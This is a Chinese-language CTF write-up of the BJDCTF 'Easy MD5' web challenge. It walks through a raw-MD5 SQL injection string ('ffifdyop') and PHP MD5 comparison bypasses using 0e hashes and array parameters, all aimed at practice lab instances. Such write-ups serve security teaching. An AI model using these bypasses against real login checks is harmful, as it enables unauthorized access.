---
title: BJDCTF Easy MD5
date: 2023-10-27T13:00:25+08:00
slug: 09030b0
tags:
  - MD5
  - tools
categories:
  - CTF
---

<font size=1>只是隐隐约约记得MD5是一种加密算法</font>

  

# SQL Injection？

输入：

- 数字

- 字母

- 数字+符号

- 简单SQL语句

- 简单XSS语句

<!--more-->

  

都没什么效果，所以抓包。

```http

GET /leveldo4.php?password=1 HTTP/1.1

Host: f4a0e561-18e7-44bb-97d3-df00b826a81a.node4.buuoj.cn:81

Upgrade-Insecure-Requests: 1

...

Referer: http://f4a0e561-18e7-44bb-97d3-df00b826a81a.node4.buuoj.cn:81/leveldo4.php?password=9

Accept-Encoding: gzip, deflate

...

```

查看Response

```htttp

HTTP/1.1 200 OK

Server: openresty

Date: Fri, 27 Oct 2023 04:28:47 GMT

Content-Type: text/html; charset=UTF-8

Connection: close

Hint: select * from 'admin' where password=md5($pass,true)

X-Powered-By: PHP/7.3.13

Content-Length: 3107

```

那个`Hint`(从 admin 表中选择密码字段等于 $pass 变量的 MD5 值的记录),比较显眼。所以启用`sqlmap`。

同时也启用`dirsearch`和`dirmap`（结果是什么也没得到）。

**结果**:

- `sqlmap`——`GET parameter 'password' does not seem to be injectable`

- `dirmap`——没有可用信息

- `dirsearch`——几个200 URL都是跳转`leveldo4.php`

  

# MD5？

  

再回看`Hint`：

  

>PHP中md5函数如果第二个参数设为true，返回的是二进制内容，如果能恰好凑出类似'or的字符串，就可以构成SQL注入

  

所以就是要构造一个经过`MD5`再经过`二进制`后得到的值有`‘or`的payload。

上网找了找，说是有

  

- `ffifdyop`

  

将password的值修改为`ffidyop`就会跳转界面`levels91.php`。

好大一个Do You Like MD5?

  

查看页面代码：

```html

<!--

    $a = $GET['a'];

    $b = $_GET['b'];

  

    if($a != $b && md5($a) == md5($b)){

        //...

    }

-->

```

  

- 1. 从 GET 请求参数中获取 `a` 和 `b` 的值，并将它们分别赋给变量 `$a` 和 `$b`。

- 2. 接下来，使用条件判断语句进行逻辑判断。如果 `$a` 不等于 `$b` 并且 `$a` 的 MD5 值等于 `$b` 的 MD5 值，即 `md5($a) == md5($b)`，则进入条件判断的代码块内部。

  

所以接下来又是寻找符合条件的a与b。

有两种解决方式：

  

>1.PHP弱类型比较绕过

  

参考<a href=https://blog.csdn.net/u014549283/article/details/81288443>PHP hash漏洞之MD5</a>可以得到：

  

- PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0

（为什么说是hash值？）

另一个简洁版本：<a href=https://www.cnblogs.com/ainsliaea/p/15126218.html>PHP MD5相等绕过</a>

  

构造payload：

```http

?a=s878926199a&b=s155964671a

```

  

>2.数组绕过

  

在上面那个简洁版本里也提到了这个数组绕过，不过说PHP8就行不通了。不过靶场的PHP依旧适用。

  

参考<a href=https://mrl64.github.io/2021/12/18/php%E5%BC%B1%E7%B1%BB%E5%9E%8B%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/>PHP弱类型绕过</a>:

  

- `md5()/sha()`这类函数无法处理数组，如果传入的是数组,`md5()`返回`NULL`，加密后得到的也是`NULL`，满足两个md5值相等

  

构造payloa：

```http

?a[]=1&b[]=2

```

  

 `a[]=1&b[]=2`，其中 `a[]` 和 `b[]` 是数组参数。当 PHP 解析这个查询字符串时，它会将这些参数解析为数组。

  

```php

$_GET['a'] = array('1');

$_GET['b'] = array('2');

```

  

- 由于md5()函数存在缺陷,加密数组的时候返回值是NULL，即在MD5加密之后，`a[]=NULL、b[]=NULL`，符合要求。

  

然后我们又跳转页面...

  

----

  
  
  

# param？

  

```php

<?php

error_reporting(0);

include "flag.php";

  

highlight_file(__FILE__);

  

if($_POST['param1']!==$_POST['param2']&&md5($_POST['param1'])===md5($_POST['param2'])){

    echo $flag;

}

```

  

其实可以看出就是call back，只不过要以`POST`方式传参，所以打开我的firefox渗透版:

```http

http://fdcf43aa-9abd-4770-8798-7d1efbb1ffb0.node4.buuoj.cn:81/levell14.php

//post data

param1[]=1&param2[]=2

```

最后得到flag。

  

-----

  

# ファンワイ

  

比较详细的解释了PHP比较和绕过的原理：<a href=https://xz.aliyun.com/t/5426>PHP 黑魔法</a><br>

  

<a href=https://www.cnblogs.com/linfangnan/p/13411103.html>CTF WEB PHP弱类型绕过</a>
